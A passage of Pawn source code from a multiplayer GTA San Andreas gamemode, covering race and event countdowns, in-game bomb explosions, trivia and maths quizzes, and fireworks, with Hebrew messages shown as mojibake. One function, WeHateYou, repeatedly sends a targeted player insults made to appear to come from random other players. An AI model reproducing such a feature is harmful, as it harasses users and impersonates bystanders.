	if(debugstate) printf("Gamemode Activity [start]: StartSRace");
	new string[M_S];
	if(ThereIsAct()) return 0;
	sraceinfo[0] = 1, sraceinfo[1] = 0, sraceinfo[2] = 60, sraceinfo[4] = 3;
	sraceinfo[3] = SetTimer("StartSRace2",1000,1);
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !îéøåõ îéåçã éúçéì á÷øåá");
	SendClientMessageToAll(green," /srace join :ìäöèøôåú øùîå àú äô÷åãä");
	SendClientMessageToAll(green," .äöèøôåú ìîéøåõ òåìä $500");
	SendClientMessageToAll(orange," /sracehelp :ìîéãò ðåñó òì äîéøåöéí äîéåçãéí øùîå àú äô÷åãä");
	format(string,sizeof(string)," .äîéøåõ éúçéì áòåã %d ùðéåú",sraceinfo[2]);
	SendClientMessageToAll(brown,string);
	SendClientMessageToAll(black,"___________________________________");
	if(debugstate) printf("Gamemode Activity [end]: StartSRace");
	return 1;
}
//=[StartSRace2]=================================================================
public StartSRace2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartSRace2");
	new string[M_S], id;
	sraceinfo[2]--;
	if(sraceinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(sraceinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~y~~h~~h~SRace: ~h~%d",sraceinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlayerPlaySound(ii,1056,0.0,0.0,0.0);
			}
		}
		if(sraceinfo[2] == 15 || sraceinfo[2] == 30)
		{
			format(string,sizeof(string)," .äîéøåõ éúçéì áòåã %d ùðéåú",sraceinfo[2]);
			SendClientMessageToAll(brown,string);
			SendClientMessageToAll(green," /srace join :ìäöèøôåú øùîå àú äô÷åãä");
		}
	}
	if(sraceinfo[2] == 5)
	{
		if(sraceinfo[1] < 3) return EndSRace(" îñôø äùç÷ðéí ùäöèøôå ÷èï î3",-1);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitsrace])
			{
				id = playerinfo[i][sraceid];
				SetFreeze(i,1);
				ResetWeapons(i);
				#if usingYSF
					//SetPlayerGravity(i,0.008000);
				#endif
				if(IsPlayerInAnyVehicle(i))
				{
					RemovePlayerFromVehicle(i);
					SetVehicleToRespawn(GetPlayerVehicleID(i));
				}
				SetPlayerPos(i,SRacePositions[id][srX],SRacePositions[id][srY],SRacePositions[id][srZ]);
				SetPlayerFacingAngle(i,SRacePositions[id][srA]);
				SetPlayerVirtualWorld(i,world_srace);
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii))
					{
						ShowPlayerNameTagForPlayer(ii,i,1);
						SetPlayerMarkerForPlayer(ii,i,GetColor(i,153));
					}
				}
				playerinfo[i][invisible] = 0;
				SetPlayerHealth2(i,100.0);
				SetPlayerArmour2(i,100.0);
				SetPlayerInterior(i,0);
				SetCameraBehindPlayer(i);
				playerinfo[i][sracecp] = 15;
				SetPlayerRaceCheckpoint(i,0,SRacePositions[15][srX],SRacePositions[15][srY],SRacePositions[15][srZ],SRacePositions[16][srX],SRacePositions[16][srY],SRacePositions[16][srZ],20.0);
				SendClientMessage(i,orange," !áäöìçä áîéøåõ äîéåçã");
			}
		}
	}
	if(sraceinfo[2] <= 0)
	{
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitsrace])
			{
				playerinfo[i][inact] = 1;
				playerinfo[i][insrace] = 1, playerinfo[i][waitsrace] = 0;
				SetFreeze(i,0);
			}
		}
		KillTimer(sraceinfo[3]);
	}
	if(debugstate) printf("Gamemode Activity [end]: StartSRace2");
	return 1;
}
//=[DestroyPickup2]=============================================================
public DestroyPickup2(pid) return DestroyPickup(pid);
//=[Explosion]==================================================================
public Explosion(playerid,bombid,bp1,bp2,bp3)
{
	new Float:p[3], string[M_S], Float:h, bool:killed=false;
	switch(bombid)
	{
		case 1: CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,15);
		case 2:
		{
			CreateExplosion(playerinfo[playerid][bombpos][0]+1.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,13);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-1.0,playerinfo[playerid][bombpos][2],7,13);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]+1.0,7,13);
		}
		case 3: CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,25);
		case 4: CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,30);
		case 5:
		{
		    playerinfo[playerid][bombpos][2] += 7.5;
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+50.5,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+30.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-50.5,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-30.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+15.5,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-15.5,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+50.5,playerinfo[playerid][bombpos][1]+15.5,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-50.5,playerinfo[playerid][bombpos][1]+15.5,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+50.5,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-50.5,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+30.0,playerinfo[playerid][bombpos][1]-15.5,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-30.0,playerinfo[playerid][bombpos][1]-15.5,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+30.0,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-30.0,playerinfo[playerid][bombpos][1]+30.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+100.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+60.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-100.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-60.0,playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+90.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]-90.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+100.0,playerinfo[playerid][bombpos][1]+90.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-100.0,playerinfo[playerid][bombpos][1]+90.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+100.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-100.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+60.0,playerinfo[playerid][bombpos][1]-90.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-60.0,playerinfo[playerid][bombpos][1]-90.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]+60.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6);
			CreateExplosion(playerinfo[playerid][bombpos][0]-60.0,playerinfo[playerid][bombpos][1]+60.0,playerinfo[playerid][bombpos][2],7,0.6);
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && IsPlayerInCircle(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],100))
				{
					GetPlayerPos(i,p[0],p[1],p[2]);
					switch(GetPlayerDistanceToPointEx(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]))
					{
						case 0..40:
						{
							SetPlayerHealth2(i,0.0);
							format(string,sizeof(string)," !%s ðäøâ îôööú äàèåí ùì %s",GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
						}
						case 41..48, 52..60:
						{
							GetPlayerHealth(i,h);
							killed = h-50.0 <= 0.0? true:false;
							SetPlayerHealth2(i,h-50.0 < 0.0? 0.0:h-50.0);
							format(string,sizeof(string),killed? (" !%s ðäøâ îôöéòä ÷ùä îôööú äàèåí ùì %s"):(" !%s ðôöò ÷ùä îôööú äàèåí ùì %s"),GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
							killed = false;
						}
						case 61..72:
						{
							GetPlayerHealth(i,h);
							killed = h-25.0 <= 0.0? true:false;
							SetPlayerHealth2(i,h-25.0 < 0.0? 0.0:h-25.0);
							format(string,sizeof(string),killed? (" !%s ðäøâ îôöéòä áéðåðéú îôööú äàèåí ùì %s"):(" !%s ðôöò áéðåðé îôööú äàèåí ùì %s"),GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
							killed = false;
						}
						case 49..51, 73..75, 98..100:
						{
							SendClientMessage(i,orange," !òîãú áð÷åãú áåðåñ ùðåúðú ìê ìçéåú âí àçøé äôööä: áðåñó ÷éáìú 10000$");
							GiveMoney(i,10000);
						}
						case 76..97:
						{
							GetPlayerHealth(i,h);
							killed = h-10.0 <= 0.0? true:false;
							SetPlayerHealth2(i,h-10.0 < 0.0? 0.0:h-10.0);
							format(string,sizeof(string),killed? (" !%s ðäøâ îôöéòä ÷ìä îôööú äàèåí ùì %s"):(" !%s ðôöò ÷ì îôööú äàèåí ùì %s"),GetName(playerid),GetName(i));
							SendClientMessageToAll(red,string);
							killed = false;
						}
					}
				}
			}
		}
		case 6:
		{
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && IsPlayerInCircle(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],150))
				{
					format(string,sizeof(string),GetPlayerDistanceToPointEx(i,playerinfo[playerid][bombpos][0],playerinfo[playerid][bombpos][1],playerinfo[playerid][bombpos][2]) <= 50 ? (" !%s ðôâò îôööú äîéîï ùì") : (" !%s ðôâò îääãó ùì ôööú äîéîï ùì %s"),GetName(playerid),GetName(i));
					SendClientMessageToAll(red,string);
				}
			}
			SetTimerEx("HydrogenBoom",400,0,"i",playerid);
			playerinfo[playerid][hbombcount] = 0;
		}
	}
	if(playerinfo[playerid][bomb] != 6) for(new i=0;i<3;i++) playerinfo[playerid][bombpos][i] = 0.0;
	playerinfo[playerid][bomb] = 0;
	if(bp1 != -1) DestroySObject(bp1);
	if(bp2 != -1) DestroySObject(bp2);
	if(bp3 != -1) DestroySObject(bp3);
	return 1;
}
//=[CanWithdraw]================================================================
public CanWithdraw(playerid)
{
	playerinfo[playerid][canwithdraw] = 1;
	return 1;
}
//=[playerCanUseAnim]===========================================================
public playerCanUseAnim(playerid)
{
	if(playerinfo[playerid][modeafk] ||
	playerinfo[playerid][inact] ||
	playerinfo[playerid][reqclass] ||
	playerinfo[playerid][frozen]) return 0;
	return 1;
}
//=[BattleCD]===================================================================
public BattleCD(playerid,playerid2)
{
	if(debugstate) printf("BattleCD(%d,%d) start",playerid,playerid2);
	if(playerinfo[playerid][bcd][0] <= 0)
	{
		KillTimer(playerinfo[playerid][bcd][1]);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,"~r~f~h~i~r~g~h~~h~h~r~t~h~~h~~h~!",2000,4);
				if(!playerinfo[i][modeafk]) PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetFreeze(i,0);
			}
		}
		playerinfo[playerid][bcd][0] = 0;
	}
	else
	{
		new string[10];
		format(string,sizeof(string),"~r~%d",playerinfo[playerid][bcd][0]);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,string,2000,4);
				playerinfo[i][bcd][0]--;
			}
		}
	}
	if(debugstate) printf("BattleCD(%d,%d) end",playerid,playerid2);
	return 1;
}
//=[DriftCD]====================================================================
public DriftCD(playerid,playerid2)
{
	if(debugstate) printf("DriftCD(%d,%d) start",playerid,playerid2);
	if(playerinfo[playerid][dcd][0] <= 0)
	{
		KillTimer(playerinfo[playerid][dcd][1]);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,"~g~s~h~t~g~a~h~~h~r~g~t~h~~h~~h~!",2000,4);
				if(!playerinfo[i][modeafk]) PlayerPlaySound(i,1057,0.0,0.0,0.0);
				SetFreeze(i,0);
			}
		}
		playerinfo[playerid][dcd][0] = 0;
	}
	else
	{
		new string[10];
		format(string,sizeof(string),"~r~%d",playerinfo[playerid][dcd][0]);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(i == playerid || i == playerid2)
			{
				GameTextForPlayer(i,string,2000,4);
				playerinfo[i][dcd][0]--;
			}
		}
	}
	if(debugstate) printf("DriftCD(%d,%d) end",playerid,playerid2);
	return 1;
}
//=[@receivestring]=============================================================
public @receivestring(const message[], const source[])
{
}
//=[@receivepacket]=============================================================
public @receivepacket(const packet[], size, const source[])
{
}
//=[PutInVehicle]===============================================================
public PutInVehicle(playerid,vehicleid,seat) return PutPlayerInVehicle(playerid,vehicleid,seat);
//=[Math]=======================================================================
public Math()
{
	if(debugstate) printf("Gamemode Activity [start]: Math");
	new string[M_S];
	maths[2] = random(2);
	switch(maths[2])
	{
		case 0: maths[2] = '+';
		case 1: maths[2] = '*';
	}
	maths[0] = randomEx(1,maths[2] == '*' ? 50 : 1000), maths[1] = randomEx(1,maths[2] == '*' ? 50 : 1000);
	switch(maths[2])
	{
		case '+': maths[3] = maths[0] + maths[1];
		case '*': maths[3] = maths[0] * maths[1];
	}
	maths[4] = 0;
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !ùàìú îúîèé÷ä ðéúðú òëùéå");
	format(string,sizeof(string)," %d %c %d = ?",maths[0],maths[2],maths[1]);
	SendClientMessageToAll(white,string);
	SendClientMessageToAll(green," /math [answer] :ìùìéçú äúùåáä");
	SendClientMessageToAll(orange,"  äøàùåï ùéôúåø àú äúøâéì éæëä áñëåí ëñôé ùééáçø ò\"ô øîú äúøâéì");
	SendClientMessageToAll(orange,"  áîéãä åìà éäéä æåëä úåê çöé ã÷ä äúøâéì ééôúø ò\"é äîòøëú");
	SendClientMessageToAll(yellow," /mathhelp :ìòæøä òí îòøëú äîúîèé÷ä");
	SendClientMessageToAll(black,"___________________________________");
	SetTimer("Math2",30000,0);
	if(debugstate) printf("Gamemode Activity [end]: Math");
	return 1;
}
//=[Math2]======================================================================
public Math2()
{
	if(debugstate) printf("Gamemode Activity [start]: Math2");
	new string[M_S];
	if(maths[5] == -1 || !IsPlayerConnected(maths[5]))
	{
		format(string,sizeof(string)," .àó àçã ìà òðä ðëåï òì úøâéì äîúîèé÷ä! äúùåáä äééúä %d",maths[3]);
		SendClientMessageToAll(red,string);
	}
	else
	{
		new pay = 0;
		switch(maths[2])
		{
			case '+': pay = 1000;
			case '*': pay = 2000;
		}
		pay += (maths[0] % 5 * maths[0] > (maths[2] == '*' ? 25 : 500) ? 1000 : 500) + (maths[1] % 5 * (maths[2] == '*' ? 25 : 500) ? 1000 : 500);
		SendClientMessage(maths[5],green," !äúùåáä ùìê ðëåðä");
		format(string,sizeof(string)," !æëä áôòéìåú äîúîèé÷ä å÷éáì %d$ %s",pay,GetName(maths[5]));
		SendClientMessageToAll(green,string);
		format(string,sizeof(string)," .äôúøåï äéä %d",maths[3]);
		SendClientMessageToAll(green,string);
		GiveMoney(maths[5],pay);
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][pmath] == maths[3] && maths[5] != i) SendClientMessage(i,red," .àúä àåîðí âí ùìçú àú äúùåáä äðëåðä, àê äîðöç ä÷ãéí àåúê");
	}
	for(new i=0;i<MAX_PLAYERS;i++) if(IsPlayerConnected(i)) playerinfo[i][pmath] = -1;
	maths[0] = -1, maths[1] = -1, maths[2] = -1, maths[3] = -1, maths[4] = 1, maths[5] = -1;
	if(debugstate) printf("Gamemode Activity [end]: Math2");
	return 1;
}
//=[Trivia]=====================================================================
public Trivia()
{
	if(debugstate) printf("Gamemode Activity [start]: Trivia");
	new string[M_S], q = random(sizeof(triviaQuestions)), qPos = 0, msgPos[3] = 0;
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," :ùàìú èøéååéä ðéúðú òëùéå");
	SendClientMessageToAll(green,triviaQuestions[q][tQuestion]);
	qPos = randomEx(1,4), trivia[0] = qPos, msgPos[0] = qPos;
	while(qPos == trivia[0]) qPos = randomEx(1,4);
	msgPos[1] = qPos;
	new moreqpos = randomEx(1,4);
	while(moreqpos == trivia[0] || moreqpos == qPos) moreqpos = randomEx(1,4);
	qPos = moreqpos, msgPos[2] = qPos;
	for(new i=1;i<4;i++)
	{
		if(msgPos[0] == i)
		{
			format(string,sizeof(string)," %d. %s",msgPos[0],triviaQuestions[q][tAnswer1]);
			SendClientMessageToAll(green,string);
		}
		if(msgPos[1] == i)
		{
			format(string,sizeof(string)," %d. %s",msgPos[1],triviaQuestions[q][tAnswer2]);
			SendClientMessageToAll(green,string);
		}
		if(msgPos[2] == i)
		{
			format(string,sizeof(string)," %d. %s",msgPos[2],triviaQuestions[q][tAnswer3]);
			SendClientMessageToAll(green,string);
		}
	}
	SendClientMessageToAll(green," /trivia [answer number] :ìùìéçú äúùåáä");
	SendClientMessageToAll(orange,"  äøàùåï ùééãò àú äúùåáä äðëåðä ìùàìä ééæëä á 5000$");
	SendClientMessageToAll(orange,"  áîéãä åìà éäéä æåëä úåê çöé ã÷ä, äèøéååéä úáåèì");
	SendClientMessageToAll(yellow," /triviahelp :ìòæøä òí îòøëú äèøéååéä");
	SendClientMessageToAll(black,"___________________________________");
	SetTimer("Trivia2",30000,0);
	if(debugstate) printf("Gamemode Activity [end]: Trivia");
	return 1;
}
//=[Trivia2]====================================================================
public Trivia2()
{
	if(debugstate) printf("Gamemode Activity [start]: Trivia2");
	if(trivia[1] == -1 || !IsPlayerConnected(trivia[1])) SendClientMessageToAll(red," !àó àçã ìà òðä ðëåï òì ùàìú äèøéååéä");
	else
	{
	    new string[M_S];
		SendClientMessage(trivia[1],green," !äúùåáä ìùàìú äèøéååéä ùùìçú ðëåðä");
		format(string,sizeof(string)," !òðä ðëåï òì ùàìú äèøéåéä å÷éáì 5000$ %s",GetName(trivia[1]));
		SendClientMessageToAll(green,string);
		GiveMoney(trivia[1],5000);
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][ptrivia] == trivia[0] && trivia[1] != i) SendClientMessage(i,red," .àúä àåîðí âí ùìçú àú äúùåáä äðëåðä, àê äîðöç ä÷ãéí àåúê");
	}
	trivia = {-1,-1};
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i)) playerinfo[i][ptrivia] = -1;
	if(debugstate) printf("Gamemode Activity [end]: Trivia2");
	return 1;
}
//=[CanP]=======================================================================
public CanP(playerid)
{
	playerinfo[playerid][canp] = 1;
	return 1;
}
//=[FireworksLine]==============================================================
public FireworksLine(Float:x,Float:y,Float:z,count)
{
	CreateFirework(fireworkLine % 2 == 0 ? 3666 : 354,x + (10.0 * fireworkLine),y,z,90.0,30.0);
	fireworkLine++;
	if(fireworkLine >= count)
	{
		KillTimer(fireworkTimer);
		useFireworks = 1;
	}
	return 1;
}
//=[FireworksMatar]=============================================================
public FireworksMatar(Float:x,Float:y,Float:z,count)
{
	CreateFirework(!random(2) ? 3666 : 354,x + floatrand(10.0,40.0),y + floatrand(10.0,40.0),z,floatrand(60.0,120.0),30.0);
	fireworkLine++;
	if(fireworkLine >= count)
	{
		KillTimer(fireworkTimer);
		useFireworks = 1;
	}
	return 1;
}
//=[allowSICommand]=============================================================
public allowSICommand() siUsed = 0;
//=[VIPSuicide]=================================================================
public VIPSuicide(playerid)
{
	new Float:p[3];
	GetPlayerPos(playerid,p[0],p[1],p[2]);
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0 && GetDistanceBetweenPlayers(playerid,i) <= 70.0)
	{
		SetPlayerHealth2(i,100000.0);
		SetPlayerArmour2(i,100.0);
	}
	CreateExplosion(p[0]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3);
	CreateExplosion(p[0]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3);
	CreateExplosion(p[0],p[1]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	CreateExplosion(p[0],p[1]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	CreateExplosion(p[0]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[1]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	CreateExplosion(p[0]+(10.0*float(playerinfo[playerid][vsuicide][0])),p[1]+(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	CreateExplosion(p[0]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3);
	CreateExplosion(p[0]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[1],p[2],1,0.3);
	CreateExplosion(p[0],p[1]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	CreateExplosion(p[0],p[1]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	CreateExplosion(p[0]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[1]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	CreateExplosion(p[0]-(10.0*float(playerinfo[playerid][vsuicide][0])),p[1]-(5.0*float(playerinfo[playerid][vsuicide][0])),p[2],1,0.3);
	for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0 && GetDistanceBetweenPlayers(playerid,i) <= 70.0)
	{
		SetPlayerHealth2(i,100.0);
		SetPlayerArmour2(i,100.0);
	}
	playerinfo[playerid][vsuicide][0]++;
	if(playerinfo[playerid][vsuicide][0] >= 8)
	{
		for(new i = 0; i < MAX_PLAYERS; i++) if(IsPlayerConnected(i) && playerinfo[i][vip] > 0 && GetDistanceBetweenPlayers(playerid,i) <= 70.0)
		{
			SetPlayerHealth2(i,100.0);
			SetPlayerArmour2(i,100.0);
		}
		SetPlayerHealth(playerid,0.0);
		KillTimer(playerinfo[playerid][vsuicide][1]);
		playerinfo[playerid][vsuicide][0] = 0;
	}
	return 1;
}
//=[Reporting]==================================================================
public Reporting(id)
{
	reporting[id] = 0;
	return 1;
}
//=[DeleteSuperbonus]===========================================================
public DeleteSuperbonus(playerid)
{
	playerinfo[playerid][sb] = 0;
	return 1;
}
//=[WeHateYou]==================================================================
public WeHateYou(playerid)
{
	assert playerinfo[playerid][wehateyou] != -1;
	playerinfo[playerid][wehateyou] = SetTimerEx("WeHateYou",750,0,"i",playerid);
	new justhate[][32] =
	{
		"We Hate You",
		"We Hate You!",
		"We Hate You!!",
		"We Hate You!!!",
		"We hate you!",
		"We hate you!!!",
		"GO AWAY!",
		"NOOB!",
		"IDIOT!",
		"ASSHOLE!",
		" àéãéåè",
		" àéãéåè!",
		" òåó îôä",
		" öà îäùøú ëáø",
		" ùåðàéí àåúê!!!",
		" ìê îëàïïïïïï",
		" ìà øåöéí àåúê ôä!",
		" ñúì÷ îôä",
		" òåó îëàï",
		" ìêêêê",
		"we hate yo!",
		"HATE U :)",
		">:-D",
		" !!öà îäñøáø",
		" !!öà îäùøú",
		" 1!!!!!!ìê îôä"
	};
	new randomPlayer = MAX_PLAYERS;
	SendPlayerMessageToPlayer(playerid,randomPlayer = GetRandomPlayer(),equal(GetName(randomPlayer),"[gmR]Amit") ? ("AmitPowerRulz") : (justhate[random(sizeof(justhate))]));
	return 1;
}
//=[SiteUpdate]=================================================================
public SiteUpdate()
{
	return 1;
}
//=[StartKickstar]==============================================================
public StartKickstar()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKickstar");
	new string[M_S];
	if(ThereIsAct()) return 0;
	kickstarinfo[0] = 1, kickstarinfo[1] = 0, kickstarinfo[2] = 60, kickstarinfo[3] = SetTimer("StartKickstar2",1000,1);
	SendClientMessageToAll(black,"___________________________________");
	SendClientMessageToAll(green," !úúçéì á÷øåá Kickstar úçøåú ä");
	SendClientMessageToAll(green," /kickstar join :ìäöèøôåú øùîå àú äô÷åãä");
	SendClientMessageToAll(green," .òåìä 400$ Kickstar äöèøôåú ìúçøåú ä");
	SendClientMessageToAll(orange," /kshelp :øùîå àú äô÷åãä Kickstar ìîéãò ðåñó òì îòøëú ä");
	format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú Kickstar úçøåú ä",kickstarinfo[2]);
	SendClientMessageToAll(brown,string);
	SendClientMessageToAll(black,"___________________________________");
	if(debugstate) printf("Gamemode Activity [end]: StartKickstar");
	return 1;
}
//=[StartKickstar2]==============================================================
public StartKickstar2()
{
	if(debugstate) printf("Gamemode Activity [start]: StartKickstar2");
	new string[M_S];
	kickstarinfo[2]--;
	if(kickstarinfo[2] > 0)
	{
		for(new i=0;i<sizeof(ActivitiesGameTextTimes);i++)
		{
			if(kickstarinfo[2] == ActivitiesGameTextTimes[i])
			{
				format(string,sizeof(string),"~r~~h~Kickstar: ~h~%d",kickstarinfo[2]);
				GameTextForAll(string,999,4);
				for(new ii=0;ii<MAX_PLAYERS;ii++) if(IsPlayerConnected(ii) && !playerinfo[ii][modeafk]) PlayerPlaySound(ii,1056,0.0,0.0,0.0);
			}
		}
		if(kickstarinfo[2] == 15 || kickstarinfo[2] == 30)
		{
			format(string,sizeof(string)," .úúçéì áòåã %d ùðéåú Kickstar úçøåú ä",kickstarinfo[2]);
			SendClientMessageToAll(brown,string);
			SendClientMessageToAll(green," /kickstar join :ìäöèøôåú øùîå àú äô÷åãä");
		}
	}
	if(kickstarinfo[2] == 5)
	{
		if(kickstarinfo[1] < 2) return EndKickstar(" îñôø äùç÷ðéí ùäöèøôå ÷èï î2",-1);
		for(new i=0;i<MAX_PLAYERS;i++)
		{
			if(IsPlayerConnected(i) && playerinfo[i][waitkickstar])
			{
				if(GetPlayerState(i) != PLAYER_STATE_DRIVER || (GetVehicleType(GetPlayerVehicleID(i)) != 0 && GetVehicleType(GetPlayerVehicleID(i)) != 1))
				{
					SendClientMessage(i,red,GetPlayerState(i) != PLAYER_STATE_DRIVER ? (" .îëéååï ùìà äééú ðäâ áøëá Kickstar ìà ùåâøú ìúçøåú ä") : (" .Kickstar ìà ùåâøú ìúçøåú îëéååï ùìà ðéúï ìäùúîù áøëá ùìê á"));
					playerinfo[i][waitkickstar] = 0;
					continue;
				}
				SetFreeze(i,1);
				#if usingYSF
					//SetPlayerGravity(i,0.008000);
				#endif
				ResetWeapons(i);
				SetPlayerVirtualWorld(i,world_kickstar);
				SetVehicleVirtualWorld(GetPlayerVehicleID(i),world_kickstar);
				SetPlayerInterior(i,0);
				LinkVehicleToInterior(GetPlayerVehicleID(i),0);
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii))
					{
